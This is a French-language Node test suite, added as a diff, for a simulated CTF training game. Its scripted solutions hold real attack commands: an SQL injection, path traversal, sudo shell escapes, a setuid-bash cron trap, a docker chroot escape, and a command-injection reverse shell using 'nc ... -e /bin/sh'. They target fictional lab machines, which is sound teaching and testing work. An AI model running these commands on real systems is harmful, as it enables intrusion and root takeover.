@@ -1,0 +1,483 @@
+#!/usr/bin/env node
+// tests/run.js — Suite de tests du moteur CTF Lab (vanilla Node, zéro dépendance).
+// Charge machines.js + engine.js dans un contexte vm isolé (avec un faux localStorage),
+// puis exécute des scénarios (parsing/pipes, exploit complet par machine, Jeopardy,
+// mode Insane) en vérifiant les résultats attendus.
+//
+// Usage : node tests/run.js   (code de sortie 0 si tout passe, 1 sinon)
+
+const fs = require("fs");
+const path = require("path");
+const vm = require("vm");
+
+// ── Chargement du moteur dans un contexte isolé ──────────────────────────────
+function freshContext() {
+  const store = {};
+  const localStorage = {
+    getItem: (k) => (k in store ? store[k] : null),
+    setItem: (k, v) => { store[k] = String(v); },
+    removeItem: (k) => { delete store[k]; },
+  };
+  const toasts = [];
+  const context = { localStorage, toast: (m) => toasts.push(m), console, toasts };
+  vm.createContext(context);
+  const code =
+    fs.readFileSync(path.join(__dirname, "../js/machines.js"), "utf8") + "\n" +
+    fs.readFileSync(path.join(__dirname, "../js/engine.js"), "utf8");
+  vm.runInContext(code, context, { filename: "engine-under-test.js" });
+  vm.runInContext("resetSessionToAttacker();", context);
+  return context;
+}
+
+function run(ctx, cmd) {
+  return vm.runInContext(`runCommand(${JSON.stringify(cmd)})`, ctx);
+}
+function pass(ctx, pwd) {
+  return vm.runInContext(`tryPassword(${JSON.stringify(pwd)})`, ctx);
+}
+function get(ctx, expr) {
+  return vm.runInContext(expr, ctx);
+}
+function unlockAll(ctx) {
+  vm.runInContext("GAME.unlocked = MACHINES.map(m => m.id);", ctx);
+}
+
+// ── Mini framework de test ───────────────────────────────────────────────────
+let passed = 0, failed = 0;
+const failures = [];
+function assert(cond, msg) {
+  if (cond) { passed++; }
+  else { failed++; failures.push(msg); console.log(`  ✗ ${msg}`); }
+}
+function assertEqual(actual, expected, msg) {
+  assert(actual === expected, `${msg} (attendu: ${JSON.stringify(expected)}, obtenu: ${JSON.stringify(actual)})`);
+}
+function section(title, fn) {
+  console.log(`\n▶ ${title}`);
+  const result = fn();
+  if (result && typeof result.then === "function") pendingAsync.push(result);
+}
+const pendingAsync = [];
+
+// ── 1. Parsing / pipes ───────────────────────────────────────────────────────
+section("Parsing & pipes", () => {
+  const ctx = freshContext();
+  const r1 = run(ctx, "echo hello world");
+  assertEqual(r1.text, "hello world", "echo simple");
+
+  run(ctx, "use nimbus");
+  run(ctx, "nmap 10.10.11.21");
+  const r2 = run(ctx, "nmap 10.10.11.21 | grep ssh");
+  assert(/ssh/.test(r2.text) && !/ftp/.test(r2.text), "grep filtre bien les lignes (ssh sans ftp)");
+
+  const r3 = run(ctx, "nmap 10.10.11.21 | wc -l");
+  assert(/^\d+$/.test(r3.text.trim()), "wc -l retourne un nombre");
+
+  const r4 = run(ctx, "echo 'b\na\nc' | sort");
+  assertEqual(r4.text, "a\nb\nc", "sort trie les lignes");
+
+  const r5 = run(ctx, "echo 'a:b:c' | cut -d ':' -f 2");
+  assertEqual(r5.text, "b", "cut extrait le bon champ");
+
+  const r6 = run(ctx, "echo 'un deux trois' | awk '{print $2}'");
+  assertEqual(r6.text, "deux", "awk extrait le bon mot");
+
+  const r7 = run(ctx, "echo '1\n2\n3\n4\n5' | head -2");
+  assertEqual(r7.text, "1\n2", "head -2 garde les 2 premières lignes");
+
+  const r8 = run(ctx, "echo '1\n2\n3\n4\n5' | tail -2");
+  assertEqual(r8.text, "4\n5", "tail -2 garde les 2 dernières lignes");
+
+  const rBad = run(ctx, "flibbertigibbet");
+  assert(rBad.cls === "t-err" && /command not found/.test(rBad.text), "commande inconnue -> bash: ... command not found");
+});
+
+// ── 2. Chaque machine : exploit complet, flags, score, badge ────────────────
+const MACHINE_SOLUTIONS = {
+  nimbus: (ctx) => {
+    run(ctx, "nmap 10.10.11.21");
+    run(ctx, "curl http://10.10.11.21/");
+    run(ctx, "ftp 10.10.11.21");
+    run(ctx, "cat ~/loot/nimbus-ftp/backup_users.txt");
+    run(ctx, "ssh jsmith@10.10.11.21");
+    pass(ctx, "N1mbus_B4ckup!2024");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo /usr/bin/less /var/log/nginx/access.log");
+    run(ctx, "!sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  vortex: (ctx) => {
+    run(ctx, "nmap 10.10.11.15");
+    run(ctx, "curl http://10.10.11.15/");
+    run(ctx, "curl http://10.10.11.15/api/docs");
+    run(ctx, "curl http://10.10.11.15/api/users/1");
+    run(ctx, "curl http://10.10.11.15/api/users/2");
+    run(ctx, "ssh kwright@10.10.11.15");
+    pass(ctx, "V0rt3x_Adm1n!77");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo man man");
+    run(ctx, "!sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+  cerberus: (ctx) => {
+    run(ctx, "nmap 10.10.11.42");
+    run(ctx, "curl http://10.10.11.42/robots.txt");
+    run(ctx, "curl http://10.10.11.42/.env");
+    run(ctx, "ssh mdurand@10.10.11.42 -p 2222");
+    pass(ctx, "Cerb3r0s_2024!");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh");
+    run(ctx, "whoami"); // laisse tourner le cron (tick au prochain runCommand)
+    run(ctx, "bash -p");
+    return run(ctx, "cat /root/root.txt");
+  },
+  obsidian: (ctx) => {
+    run(ctx, "nmap 10.10.11.77");
+    run(ctx, "curl http://10.10.11.77:8000/");
+    run(ctx, "curl http://10.10.11.77:8000/old/site-backup.txt");
+    run(ctx, "ssh tvasquez@10.10.11.77");
+    pass(ctx, "0bs1d1an_D3ploy#99");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "find / -perm -4000 -type f 2>/dev/null");
+    run(ctx, "find . -exec /bin/sh -p \\; -quit");
+    return run(ctx, "cat /root/root.txt");
+  },
+  phantom: (ctx) => {
+    run(ctx, "nmap 10.10.11.58");
+    run(ctx, "curl http://10.10.11.58/");
+    run(ctx, "curl \"http://10.10.11.58/index.php?page=../../../../var/www/html/config.php.bak\"");
+    run(ctx, "curl -d \"user=broland&pass=' OR '1'='1' -- -\" http://10.10.11.58/admin/login.php");
+    run(ctx, "ssh broland@10.10.11.58");
+    pass(ctx, "Ph4nt0m_SQL1_2024!");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo awk 'BEGIN {system(\"/bin/sh\")}'");
+    return run(ctx, "cat /root/root.txt");
+  },
+  meridian: (ctx) => {
+    run(ctx, "nmap 10.10.11.101");
+    run(ctx, "curl http://10.10.11.101:8080/");
+    run(ctx, "curl \"http://10.10.11.101:8080/report?file=../../../../etc/meridian/config.bak\"");
+    run(ctx, "ssh npatel@10.10.11.101");
+    pass(ctx, "M3r1d1an_Ops#41");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "sudo python3 -c 'import os; os.system(\"/bin/sh\")'");
+    return run(ctx, "cat /root/root.txt");
+  },
+  glacier: (ctx) => {
+    run(ctx, "nmap 10.10.11.230");
+    run(ctx, "ftp 10.10.11.230");
+    run(ctx, "cat ~/loot/glacier-ftp/svc_notes.txt");
+    run(ctx, "ssh svc_backup@10.10.11.230");
+    pass(ctx, "B4ckup_Serv1ce#22");
+    run(ctx, "type user.txt");
+    run(ctx, "schtasks /query");
+    run(ctx, "icacls C:\\Scripts\\backup.bat");
+    run(ctx, "echo copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\svc.exe >> C:\\Scripts\\backup.bat");
+    run(ctx, "whoami"); // laisse tourner la tâche planifiée
+    run(ctx, "C:\\Windows\\Temp\\svc.exe");
+    return run(ctx, "type root.txt");
+  },
+  axiom: (ctx) => {
+    run(ctx, "nmap 10.10.11.244");
+    run(ctx, "curl http://10.10.11.244:8080/");
+    run(ctx, "curl http://10.10.11.244:8080/logs/latest.txt");
+    run(ctx, "ssh cibuild@10.10.11.244");
+    pass(ctx, "Ax1om_CI_Runner#88");
+    run(ctx, "cat user.txt");
+    run(ctx, "sudo -l");
+    run(ctx, "id");
+    run(ctx, "docker ps");
+    run(ctx, "docker run -v /:/mnt --rm -it alpine chroot /mnt sh");
+    return run(ctx, "cat /root/root.txt");
+  },
+};
+
+section("Machines : recon -> accès -> privesc -> flags (les 8 machines)", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  const machines = get(ctx, "MACHINES");
+  assertEqual(machines.length, 8, "8 machines définies dans MACHINES");
+
+  let totalScoreCheck = 0;
+  for (const m of machines) {
+    run(ctx, `use ${m.id}`);
+    const solver = MACHINE_SOLUTIONS[m.id];
+    assert(!!solver, `une solution de test existe pour ${m.id}`);
+    if (!solver) continue;
+    const last = solver(ctx);
+    assert(last && last.cls !== "t-err", `${m.id} : dernière étape sans erreur (${last && last.text && last.text.slice(0, 60)})`);
+    const p = get(ctx, `GAME.progress.${m.id}`);
+    assert(p.recon && p.access && p.privesc && p.userFlag && p.rootFlag, `${m.id} : recon+accès+privesc+2 flags tous validés`);
+  }
+
+  const finalScore = get(ctx, "GAME.score");
+  // 8 machines * (100 recon + 150 accès + 250 privesc + 100 userFlag + 200 rootFlag) = 8 * 800 = 6400
+  assertEqual(finalScore, 6400, "score total cohérent après les 8 machines (100+150+250+100+200 par machine)");
+
+  const badges = get(ctx, "GAME.badges");
+  assert(badges["completionist"] === true, "badge 🌐 tour complet débloqué après les 8 machines");
+});
+
+section("Lore transversal : note_interne.txt présent sur chaque machine sans fausser le score", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  const machines = get(ctx, "MACHINES");
+  for (const m of machines) {
+    run(ctx, `use ${m.id}`);
+    const solver = MACHINE_SOLUTIONS[m.id];
+    if (!solver) continue;
+    solver(ctx);
+    const scoreBefore = get(ctx, "GAME.score");
+    const lore = run(ctx, "cat ~/note_interne.txt");
+    assert(lore.cls !== "t-err", `${m.id} : note_interne.txt est bien présent et lisible`);
+    assert(!/FLAG\{/.test(lore.text), `${m.id} : note_interne.txt ne contient pas de flag (pur easter egg narratif)`);
+    assertEqual(get(ctx, "GAME.score"), scoreBefore, `${m.id} : lire la note narrative ne modifie pas le score`);
+  }
+});
+
+// ── 3. reset <machine> rembourse exactement les points gagnés ───────────────
+section("reset rembourse les points gagnés sur une machine", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use nimbus");
+  MACHINE_SOLUTIONS.nimbus(ctx);
+  const before = get(ctx, "GAME.score");
+  assert(before > 0, "score > 0 après avoir terminé nimbus");
+  run(ctx, "reset nimbus");
+  const after = get(ctx, "GAME.score");
+  assertEqual(after, 0, "reset nimbus ramène le score à 0 (seule machine jouée)");
+  const p = get(ctx, "GAME.progress.nimbus");
+  assert(!p.recon && !p.access && !p.privesc && !p.userFlag && !p.rootFlag, "reset nimbus efface bien toute la progression");
+});
+
+// ── 4. Mode Jeopardy : chaque défi accepte sa bonne réponse, refuse une mauvaise ─
+section("Mode Jeopardy : tous les défis sont résolubles", () => {
+  const ctx = freshContext();
+  const challenges = get(ctx, "CHALLENGES");
+  assert(challenges.length >= 6, `au moins 6 défis Jeopardy définis (trouvé ${challenges.length})`);
+
+  for (const c of challenges) {
+    const wrong = run(ctx, `submit ${c.id} FLAG{mauvaise_reponse}`);
+    assert(wrong.cls === "t-err", `${c.id} : une mauvaise réponse est rejetée`);
+    const right = run(ctx, `submit ${c.id} ${c.answer}`);
+    assert(right.cls !== "t-err", `${c.id} : la bonne réponse (${c.answer}) est acceptée`);
+    assertEqual(get(ctx, `GAME.jeopardy.solved.${c.id}`), true, `${c.id} : marqué comme résolu`);
+  }
+
+  const badges = get(ctx, "GAME.badges");
+  assertEqual(badges["jeopardy_complete"], true, "badge Jeopardy complet débloqué après tous les défis");
+});
+
+// ── 5. hashcat (challenge hashcrack) et RSA toy sont cohérents avec leur flag ─
+section("hashcat retrouve bien le mot de passe attendu", () => {
+  const ctx = freshContext();
+  const c = get(ctx, "CHALLENGES").find((cc) => cc.id === "hashcrack");
+  const shown = run(ctx, `challenge ${c.id}`);
+  const hashMatch = shown.text.match(/[0-9a-f]{8,}/i);
+  assert(!!hashMatch, "l'énoncé du défi hashcrack contient bien un hash-VX à casser");
+  if (hashMatch) {
+    const cracked = run(ctx, `hashcat ${hashMatch[0]}`);
+    assert(cracked.cls !== "t-err", "hashcat retrouve une correspondance dans la wordlist embarquée");
+  }
+});
+
+// ── 6. Mode Insane : bloque les indices, multiplie le score, verrouillé hors partie neuve ─
+section("Mode Insane", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+
+  const onFresh = run(ctx, "insane on");
+  assert(onFresh.cls !== "t-err", "insane on fonctionne sur une sauvegarde neuve");
+  assertEqual(get(ctx, "GAME.insaneMode"), true, "GAME.insaneMode passe à true");
+
+  run(ctx, "use nimbus");
+  const hinted = run(ctx, "hint");
+  assert(hinted.cls === "t-err", "hint est bloqué en mode Insane");
+
+  run(ctx, "nmap 10.10.11.21");
+  assertEqual(get(ctx, "GAME.score"), 150, "le score de recon (100) est multiplié par 1.5 en mode Insane");
+
+  const offMidGame = run(ctx, "insane off");
+  assert(offMidGame.cls === "t-err", "insane off refusé en cours de partie (score != 0)");
+
+  run(ctx, "reset nimbus");
+  const offAfterReset = run(ctx, "insane off");
+  assert(offAfterReset.cls !== "t-err", "insane off fonctionne à nouveau une fois la partie redevenue neuve");
+  assertEqual(get(ctx, "GAME.insaneMode"), false, "GAME.insaneMode repasse à false");
+});
+
+// ── 7. Chiffrement export/import (logique AES-GCM/PBKDF2, dupliquée depuis app.js) ──
+// app.js pilote le DOM (file picker, téléchargement) donc n'est pas testable ici directement ;
+// ce test vérifie que l'algorithme choisi (PBKDF2-SHA256 -> AES-GCM) fait un aller-retour correct
+// et rejette bien une mauvaise passphrase, avec l'implémentation Web Crypto native de Node.
+section("Chiffrement export/import (AES-GCM + PBKDF2, round-trip)", () => {
+  const { webcrypto } = require("crypto");
+  const subtle = webcrypto.subtle;
+
+  function bufToB64(buf) { return Buffer.from(buf).toString("base64"); }
+  function b64ToBuf(b64) { return new Uint8Array(Buffer.from(b64, "base64")); }
+  async function deriveKey(passphrase, salt, usages) {
+    const enc = new TextEncoder();
+    const keyMaterial = await subtle.importKey("raw", enc.encode(passphrase), "PBKDF2", false, ["deriveKey"]);
+    return subtle.deriveKey({ name: "PBKDF2", salt, iterations: 150000, hash: "SHA-256" }, keyMaterial, { name: "AES-GCM", length: 256 }, false, usages);
+  }
+  async function encrypt(plaintext, passphrase) {
+    const salt = webcrypto.getRandomValues(new Uint8Array(16));
+    const iv = webcrypto.getRandomValues(new Uint8Array(12));
+    const key = await deriveKey(passphrase, salt, ["encrypt"]);
+    const ciphertext = await subtle.encrypt({ name: "AES-GCM", iv }, key, new TextEncoder().encode(plaintext));
+    return { format: "ctf-lab-save", v: 1, salt: bufToB64(salt), iv: bufToB64(iv), data: bufToB64(ciphertext) };
+  }
+  async function decrypt(envelope, passphrase) {
+    const key = await deriveKey(passphrase, b64ToBuf(envelope.salt), ["decrypt"]);
+    const plainBuf = await subtle.decrypt({ name: "AES-GCM", iv: b64ToBuf(envelope.iv) }, key, b64ToBuf(envelope.data));
+    return new TextDecoder().decode(plainBuf);
+  }
+
+  return (async () => {
+    const original = JSON.stringify({ score: 1234, insaneMode: true, note: "état de partie factice" });
+    const envelope = await encrypt(original, "correct-horse-battery-staple");
+    assert(envelope.format === "ctf-lab-save", "l'enveloppe chiffrée a le bon format");
+
+    const decrypted = await decrypt(envelope, "correct-horse-battery-staple");
+    assertEqual(decrypted, original, "le déchiffrement avec la bonne passphrase restaure exactement le JSON d'origine");
+
+    let wrongPassphraseFailed = false;
+    try { await decrypt(envelope, "mauvaise-passphrase"); } catch (e) { wrongPassphraseFailed = true; }
+    assert(wrongPassphraseFailed, "le déchiffrement avec une mauvaise passphrase échoue (tag d'authentification AES-GCM)");
+  })();
+});
+
+// ── 8. vim minimal : édition de fichier, et alternative à echo pour le privesc cron ──
+section("vim : éditeur minimal", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+
+  // Création + édition d'un fichier local côté attaquant
+  const open1 = run(ctx, "vim ~/notes-perso.txt");
+  assert(open1.cls !== "t-err", "vim ouvre un nouveau fichier sans erreur");
+  run(ctx, "premiere ligne");
+  run(ctx, "deuxieme ligne");
+  const saved = run(ctx, ":wq");
+  assert(saved.cls === "t-ok", "vim :wq confirme l'enregistrement");
+  const catBack = run(ctx, "cat ~/notes-perso.txt");
+  assertEqual(catBack.text, "premiere ligne\ndeuxieme ligne", "le contenu écrit via vim est bien relu avec cat");
+
+  // :q! n'enregistre rien
+  run(ctx, "vim ~/abandon.txt");
+  run(ctx, "ce texte ne doit pas être sauvé");
+  run(ctx, ":q!");
+  const catAbandon = run(ctx, "cat ~/abandon.txt");
+  assert(catAbandon.cls === "t-err", "vim :q! n'a rien enregistré, le fichier n'existe pas");
+
+  // vim comme alternative à `echo >>` pour piéger le script cron de cerberus
+  run(ctx, "use cerberus");
+  run(ctx, "nmap 10.10.11.42");
+  run(ctx, "curl http://10.10.11.42/robots.txt");
+  run(ctx, "curl http://10.10.11.42/.env");
+  run(ctx, "ssh mdurand@10.10.11.42 -p 2222");
+  pass(ctx, "Cerb3r0s_2024!");
+  run(ctx, "cat user.txt");
+  run(ctx, "sudo -l");
+  run(ctx, "vim /opt/scripts/backup.sh");
+  run(ctx, "#!/bin/bash");
+  run(ctx, "# sauvegarde quotidienne");
+  run(ctx, "tar -czf /var/backups/data.tar.gz /srv/data");
+  run(ctx, "chmod +s /bin/bash");
+  run(ctx, ":wq");
+  run(ctx, "whoami"); // laisse tourner le cron (tick au prochain runCommand)
+  const rooted = run(ctx, "bash -p");
+  assert(rooted.cls !== "t-err", "vim peut planter la charge utile cron tout comme echo >>, bash -p réussit");
+  const rootFlag = run(ctx, "cat /root/root.txt");
+  assert(/FLAG\{cerberus_root/.test(rootFlag.text), "root.txt de cerberus est bien récupérable après un privesc piégé via vim");
+});
+
+// ── 9. nc : bannière brute sur un port ouvert, refus sur port fermé/machine verrouillée ──
+section("nc : connexion bannière", () => {
+  const ctx = freshContext();
+  const usage = run(ctx, "nc");
+  assert(usage.cls === "t-err", "nc sans arguments renvoie une erreur d'usage");
+
+  const locked = run(ctx, "nc 10.10.11.42 80"); // cerberus, pas encore débloquée
+  assert(locked.cls === "t-err", "nc refuse une machine encore verrouillée");
+
+  unlockAll(ctx);
+  const closed = run(ctx, "nc 10.10.11.21 4444");
+  assert(closed.cls === "t-err", "nc refuse un port fermé");
+
+  const opened = run(ctx, "nc 10.10.11.21 22");
+  assert(opened.cls !== "t-err" && /OpenSSH/.test(opened.text), "nc affiche la bannière d'un port ouvert (ssh sur nimbus)");
+});
+
+// ── 10. Validation de schéma des machines (premier pas vers du JSON déclaratif) ──
+section("validateMachines : garde-fou de schéma", () => {
+  const ctx = freshContext();
+  const cleanErrors = get(ctx, "validateMachines(MACHINES)");
+  assertEqual(cleanErrors.length, 0, `les 8 machines réelles ne remontent aucune erreur de schéma (obtenu : ${JSON.stringify(cleanErrors)})`);
+
+  const broken = get(ctx, `
+    (() => {
+      const clone = JSON.parse(JSON.stringify(MACHINES));
+      delete clone[0].ip;
+      clone[1].id = clone[2].id; // doublon d'id volontaire
+      clone[3].privesc.type = "totally-invalid-type";
+      return validateMachines(clone);
+    })()
+  `);
+  assert(broken.length >= 3, `une machine volontairement cassée (ip manquante, id en doublon, privesc.type invalide) remonte bien plusieurs erreurs (obtenu ${broken.length})`);
+});
+
+// ── 11. Reverse shell manuel (nc -lvnp + injection de commande) sur MERIDIAN ──
+section("nc -lvnp : reverse shell manuel comme chemin alternatif", () => {
+  const ctx = freshContext();
+  unlockAll(ctx);
+  run(ctx, "use meridian");
+  run(ctx, "nmap 10.10.11.101");
+  run(ctx, "curl http://10.10.11.101:8080/");
+
+  const noListener = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
+  assert(noListener.cls === "t-err", "sans écoute au préalable, la requête ne donne rien");
+  assertEqual(get(ctx, "GAME.progress.meridian.access"), false, "aucun accès accordé sans nc -lvnp au bon port");
+
+  const wrongPort = run(ctx, "nc -lvnp 1234");
+  assert(wrongPort.cls !== "t-err", "nc -lvnp démarre bien l'écoute");
+  const stillNoAccess = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
+  assert(stillNoAccess.cls === "t-err", "écoute sur le mauvais port -> toujours pas d'accès");
+
+  run(ctx, "nc -lvnp 4444");
+  const shell = run(ctx, "curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"");
+  assert(shell.cls !== "t-err", "écoute sur le bon port + requête -> connexion reçue");
+  assertEqual(get(ctx, "GAME.progress.meridian.access"), true, "l'accès initial est bien marqué via le chemin reverse shell");
+  assertEqual(get(ctx, "SESSION.ctx"), "meridian", "la session bascule bien sur meridian après la reverse shell");
+  assertEqual(get(ctx, "SESSION.user"), "npatel", "la reverse shell atterrit avec le même utilisateur que ssh (simplification assumée)");
+
+  const flag = run(ctx, "cat user.txt");
+  assert(/FLAG\{meridian_acces_initial/.test(flag.text), "le flag utilisateur reste accessible après un accès obtenu par reverse shell");
+
+  // Le score d'accès n'est crédité qu'une fois, même en repassant par le chemin ssh ensuite
+  const scoreAfterShell = get(ctx, "GAME.score");
+  run(ctx, "exit");
+  run(ctx, "ssh npatel@10.10.11.101");
+  pass(ctx, "M3r1d1an_Ops#41");
+  assertEqual(get(ctx, "GAME.score"), scoreAfterShell, "repasser par ssh après la reverse shell ne recrédite pas les points d'accès");
+});
+
+// ── Rapport final ─────────────────────────────────────────────────────────────
+Promise.all(pendingAsync).then(() => {
+  console.log(`\n${"─".repeat(60)}`);
+  console.log(`${passed} test(s) passés, ${failed} échoué(s).`);
+  if (failed > 0) {
+    console.log("\nÉchecs :");
+    failures.forEach((f) => console.log(`  - ${f}`));
+    process.exit(1);
+  } else {
+    console.log("✅ Tous les tests passent.");
+    process.exit(0);
+  }
+});
